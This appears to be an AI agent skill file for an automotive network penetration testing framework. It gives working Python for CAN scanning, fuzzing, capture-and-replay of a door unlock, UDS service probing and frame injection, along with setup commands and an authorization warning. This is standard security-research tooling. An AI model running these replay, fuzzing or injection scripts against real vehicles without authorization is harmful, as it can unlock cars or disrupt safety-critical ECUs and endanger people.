---
name: s800-vehicle-network-security-testing
description: Security testing framework for automotive vehicle networks (CAN, LIN, FlexRay) with fuzzing and protocol analysis capabilities
triggers:
  - test vehicle network security
  - fuzz CAN bus messages
  - analyze automotive protocols
  - scan vehicle network vulnerabilities
  - perform car security testing
  - test ECU communication
  - vehicle penetration testing
  - automotive network fuzzing
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

S800 is a vehicle network security testing framework designed for penetration testing and security analysis of automotive communication protocols including CAN (Controller Area Network), LIN (Local Interconnect Network), and FlexRay. It provides tools for fuzzing, protocol analysis, vulnerability scanning, and ECU (Electronic Control Unit) testing.

**Warning**: This framework is for authorized security testing only. Unauthorized testing of vehicle networks may be illegal and dangerous.

## Installation

### Prerequisites

```bash
# Install required dependencies
sudo apt-get update
sudo apt-get install python3 python3-pip can-utils
pip3 install python-can cantools scapy
```

### Hardware Requirements

- CAN interface adapter (e.g., SocketCAN compatible device, PEAK-USB, Kvaser)
- OBD-II connector or direct ECU access
- Supported vehicle or test bench

### Setup SocketCAN Interface

```bash
# Load kernel modules
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan

# Create virtual CAN interface (for testing)
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Or configure physical CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
```

### Clone and Install

```bash
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework
pip3 install -r requirements.txt
```

## Core Components

### 1. CAN Bus Scanner

Scan for active CAN IDs on the network:

```python
#!/usr/bin/env python3
import can
import time

def scan_can_bus(interface='can0', duration=10):
    """Scan CAN bus for active IDs"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    seen_ids = set()
    
    start_time = time.time()
    while time.time() - start_time < duration:
        msg = bus.recv(timeout=1.0)
        if msg:
            seen_ids.add(msg.arbitration_id)
            print(f"ID: 0x{msg.arbitration_id:03X} Data: {msg.data.hex()}")
    
    bus.shutdown()
    return sorted(seen_ids)

# Usage
active_ids = scan_can_bus('can0', duration=30)
print(f"Found {len(active_ids)} active CAN IDs")
```

### 2. CAN Fuzzer

Fuzz CAN messages to discover vulnerabilities:

```python
#!/usr/bin/env python3
import can
import random
import time

def fuzz_can_id(interface, target_id, num_packets=1000, delay=0.01):
    """Fuzz a specific CAN ID with random data"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    for i in range(num_packets):
        # Generate random data (8 bytes for standard CAN)
        data = [random.randint(0, 255) for _ in range(8)]
        msg = can.Message(
            arbitration_id=target_id,
            data=data,
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            print(f"[{i+1}/{num_packets}] Sent ID 0x{target_id:03X}: {bytes(data).hex()}")
            time.sleep(delay)
        except can.CanError as e:
            print(f"Error sending message: {e}")
    
    bus.shutdown()

# Usage - fuzz diagnostic ID
fuzz_can_id('can0', target_id=0x7DF, num_packets=500)
```

### 3. Protocol Replay Attack

Capture and replay CAN messages:

```python
#!/usr/bin/env python3
import can
import pickle
import time

def capture_traffic(interface, duration=60, output_file='capture.pkl'):
    """Capture CAN traffic to file"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    messages = []
    
    start_time = time.time()
    print(f"Capturing for {duration} seconds...")
    
    while time.time() - start_time < duration:
        msg = bus.recv(timeout=1.0)
        if msg:
            messages.append({
                'id': msg.arbitration_id,
                'data': msg.data,
                'timestamp': msg.timestamp
            })
    
    bus.shutdown()
    
    with open(output_file, 'wb') as f:
        pickle.dump(messages, f)
    
    print(f"Captured {len(messages)} messages")
    return messages

def replay_traffic(interface, input_file='capture.pkl', speed=1.0):
    """Replay captured CAN traffic"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    with open(input_file, 'rb') as f:
        messages = pickle.load(f)
    
    print(f"Replaying {len(messages)} messages at {speed}x speed")
    
    for i, msg_data in enumerate(messages):
        msg = can.Message(
            arbitration_id=msg_data['id'],
            data=msg_data['data']
        )
        bus.send(msg)
        
        # Maintain timing between messages
        if i < len(messages) - 1:
            delay = (messages[i+1]['timestamp'] - msg_data['timestamp']) / speed
            time.sleep(max(0, delay))
    
    bus.shutdown()

# Usage
capture_traffic('can0', duration=30, output_file='door_unlock.pkl')
replay_traffic('can0', input_file='door_unlock.pkl')
```

### 4. UDS (Unified Diagnostic Services) Scanner

Scan for diagnostic services:

```python
#!/usr/bin/env python3
import can
import time

class UDSScanner:
    """Scan for UDS diagnostic services"""
    
    DIAGNOSTIC_REQUEST = 0x7DF
    DIAGNOSTIC_RESPONSE = 0x7E8
    
    UDS_SERVICES = {
        0x10: "DiagnosticSessionControl",
        0x11: "ECUReset",
        0x14: "ClearDiagnosticInformation",
        0x19: "ReadDTCInformation",
        0x22: "ReadDataByIdentifier",
        0x23: "ReadMemoryByAddress",
        0x27: "SecurityAccess",
        0x28: "CommunicationControl",
        0x2E: "WriteDataByIdentifier",
        0x31: "RoutineControl",
        0x34: "RequestDownload",
        0x36: "TransferData",
        0x37: "RequestTransferExit",
        0x3E: "TesterPresent"
    }
    
    def __init__(self, interface='can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def send_uds(self, service_id, data=[]):
        """Send UDS request and wait for response"""
        msg_data = [len(data) + 1, service_id] + data
        msg_data.extend([0x00] * (8 - len(msg_data)))
        
        msg = can.Message(
            arbitration_id=self.DIAGNOSTIC_REQUEST,
            data=msg_data[:8]
        )
        
        self.bus.send(msg)
        
        # Wait for response
        timeout = time.time() + 1.0
        while time.time() < timeout:
            response = self.bus.recv(timeout=0.1)
            if response and response.arbitration_id == self.DIAGNOSTIC_RESPONSE:
                return response.data
        return None
    
    def scan_services(self):
        """Scan for supported UDS services"""
        supported = []
        
        for service_id, service_name in self.UDS_SERVICES.items():
            print(f"Testing {service_name} (0x{service_id:02X})...")
            response = self.send_uds(service_id)
            
            if response:
                if response[1] == service_id + 0x40:
                    supported.append((service_id, service_name))
                    print(f"  ✓ Supported: {response.hex()}")
                elif response[1] == 0x7F:
                    print(f"  ✗ Negative response: 0x{response[3]:02X}")
            time.sleep(0.1)
        
        return supported
    
    def close(self):
        self.bus.shutdown()

# Usage
scanner = UDSScanner('can0')
supported_services = scanner.scan_services()
print(f"\nFound {len(supported_services)} supported services")
scanner.close()
```

### 5. CAN Frame Injection

Inject specific CAN frames:

```python
#!/usr/bin/env python3
import can

def inject_can_frame(interface, can_id, data_hex):
    """Inject a single CAN frame"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    # Convert hex string to bytes
    data = bytes.fromhex(data_hex)
    
    msg = can.Message(
        arbitration_id=can_id,
        data=data,
        is_extended_id=False
    )
    
    bus.send(msg)
    print(f"Injected: ID=0x{can_id:03X} Data={data.hex()}")
    bus.shutdown()

def inject_sequence(interface, sequence):
    """Inject a sequence of CAN frames"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    for can_id, data_hex, delay in sequence:
        data = bytes.fromhex(data_hex)
        msg = can.Message(arbitration_id=can_id, data=data)
        bus.send(msg)
        print(f"Sent: 0x{can_id:03X} {data.hex()}")
        time.sleep(delay)
    
    bus.shutdown()

# Usage - inject door unlock sequence
unlock_sequence = [
    (0x123, "0102030405060708", 0.01),
    (0x456, "AABBCCDDEE", 0.01),
    (0x789, "FF00FF00", 0.1)
]
inject_sequence('can0', unlock_sequence)
```

## Configuration

### Create Configuration File

```python
# config.py
CONFIG = {
    'interface': 'can0',
    'bitrate': 500000,
    'log_file': '/var/log/s800_scan.log',
    'target_ids': [0x7DF, 0x7E0, 0x7E8],
    'fuzzing': {
        'delay': 0.01,
        'max_packets': 10000,
        'random_seed': None
    },
    'capture': {
        'output_dir': './captures',
        'max_file_size': 100 * 1024 * 1024  # 100MB
    }
}
```

## Troubleshooting

### CAN Interface Not Found

```bash
# Check available interfaces
ip link show

# Verify SocketCAN modules loaded
lsmod | grep can

# Check dmesg for hardware errors
dmesg | grep -i can
```

### Permission Denied

```bash
# Add user to dialout/can group
sudo usermod -a -G dialout $USER

# Or run with elevated privileges
sudo python3 scanner.py
```

### No Messages Received

```python
# Verify CAN bus is active
candump can0

# Check bitrate matches vehicle
sudo ip link set can0 type can bitrate 250000
```

### Bus Off State

```bash
# Reset CAN interface
sudo ip link set can0 down
sudo ip link set can0 up
```

## Best Practices

1. **Always test on isolated networks** or test benches first
2. **Log all actions** for audit and analysis
3. **Monitor vehicle state** during testing to detect anomalies
4. **Use rate limiting** to avoid overwhelming the bus
5. **Keep backups** of original ECU configurations
6. **Get authorization** before testing any production vehicle

## Environment Variables

```bash
export S800_INTERFACE=can0
export S800_BITRATE=500000
export S800_LOG_LEVEL=DEBUG
export S800_OUTPUT_DIR=/var/log/s800
```
